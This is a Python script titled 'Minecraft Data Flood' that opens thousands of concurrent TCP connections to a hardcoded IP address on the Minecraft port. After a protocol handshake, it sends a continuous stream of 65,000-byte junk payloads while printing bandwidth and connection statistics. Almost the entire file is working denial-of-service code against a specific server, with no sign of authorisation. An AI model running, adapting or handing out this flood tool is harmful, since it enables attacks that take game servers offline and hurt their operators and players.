"""
Minecraft Data Flood - 10000 tasks with proper handshake
"""
import socket, time, sys, asyncio, struct, hashlib
from colorama import init, Fore
init(autoreset=True)

TARGET_IP = "5.133.100.33"
TARGET_PORT = 25565
TASK_COUNT = 5000
TEST_DURATION = 30
PAYLOAD_SIZE = 65000
PAYLOAD = b'x' * PAYLOAD_SIZE

# ─── MINECRAFT PACKET HELPERS ─────────────────────────────────────────────────
def varint(val):
    out = b''
    while True:
        b = val & 0x7F
        val >>= 7
        if val:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            break
    return out

def pstr(s):
    e = s.encode('utf-8')
    return varint(len(e)) + e

def make_handshake(ip, port, nstate):
    h = varint(0x00) + varint(767) + pstr(ip) + struct.pack('>H', port) + varint(nstate)
    return varint(len(h)) + h

def make_status_req():
    r = varint(0x00)
    return varint(len(r)) + r

# ─── CACHED PACKETS ───────────────────────────────────────────────────────────
HANDSHAKE_STATUS = make_handshake(TARGET_IP, TARGET_PORT, 1)
STATUS_REQ = make_status_req()

bytes_sent = 0
connections = 0
errors = 0
packets_sent = 0
lock = asyncio.Lock()

async def flood_task(stop):
    global bytes_sent, connections, errors, packets_sent
    loop = asyncio.get_running_loop()
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5.0)
            s.setblocking(False)
            await asyncio.wait_for(loop.sock_connect(s, (TARGET_IP, TARGET_PORT)), timeout=3.0)

            # Send handshake + status req
            await loop.sock_sendall(s, HANDSHAKE_STATUS)
            await loop.sock_sendall(s, STATUS_REQ)

            async with lock:
                connections += 1

            # Now keep sending data until server disconnects
            while not stop.is_set():
                await loop.sock_sendall(s, PAYLOAD)
                async with lock:
                    bytes_sent += len(PAYLOAD)
                    packets_sent += 1

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
            async with lock:
                errors += 1
        except asyncio.TimeoutError:
            async with lock:
                errors += 1
        except Exception:
            async with lock:
                errors += 1
        finally:
            try: s.close()
            except: pass

async def monitor(stop, start_time, tasks):
    while not stop.is_set():
        await asyncio.sleep(0.5)
        elapsed = time.time() - start_time
        if elapsed >= TEST_DURATION:
            stop.set()
            break
        async with lock:
            b = bytes_sent; c = connections; e = errors; p = packets_sent
        rate = b / max(elapsed, 0.1)
        mbps = rate * 8 / 1_000_000
        er = (e / max(c + e, 1)) * 100
        alive = sum(1 for t in tasks if not t.done())
        print(f"\r[TIME] {elapsed:.0f}s | "
              f"[DATA] {b/1_000_000:.1f}MB | "
              f"[RATE] {mbps:.0f}Mbps | "
              f"[PKTS] {p:,} | "
              f"[CONN] {c} ({c/max(elapsed,0.1):.0f}/s) | "
              f"[ERR] {e} ({er:.1f}%) | "
              f"[TASKS] {alive}/{len(tasks)}", end="", flush=True)

async def main_async():
    print(f"[FLOOD] {TASK_COUNT} asyncio tasks x {PAYLOAD_SIZE}B to {TARGET_IP}:{TARGET_PORT}")
    print(f"[DURATION] {TEST_DURATION}s\n")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3); s.connect((TARGET_IP, TARGET_PORT)); s.close()
        print("[OK] Connected\n")
    except Exception as e:
        print(f"[ERROR] {e}"); return

    stop = asyncio.Event()
    print("[START] Creating tasks...")
    tasks = [asyncio.create_task(flood_task(stop)) for _ in range(TASK_COUNT)]
    print(f"[RUN] {len(tasks)} tasks started\n")

    start = time.time()
    mon = asyncio.create_task(monitor(stop, start, tasks))
    await asyncio.gather(*tasks, return_exceptions=True)
    await mon

    elapsed = time.time() - start
    async with lock:
        b = bytes_sent; c = connections; e = errors; p = packets_sent
    rate = b / max(elapsed, 0.1)
    mbps = rate * 8 / 1_000_000
    er = (e / max(c + e, 1)) * 100

    print(f"\n[RESULT]")
    print(f"[TIME] {elapsed:.1f}s")
    print(f"[DATA] {b/1_000_000:.1f}MB ({b:,} bytes)")
    print(f"[RATE] {mbps:.0f}Mbps ({rate:.0f} B/s)")
    print(f"[PKTS] {p:,} packets")
    print(f"[CONN] {c:,} ({c/max(elapsed,0.1):.0f}/s)")
    print(f"[ERR] {e:,} ({er:.1f}%)")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[STOP] Interrupted")
    except Exception as ex:
        print(f"[FATAL] {ex}")

if __name__ == "__main__":
    main()
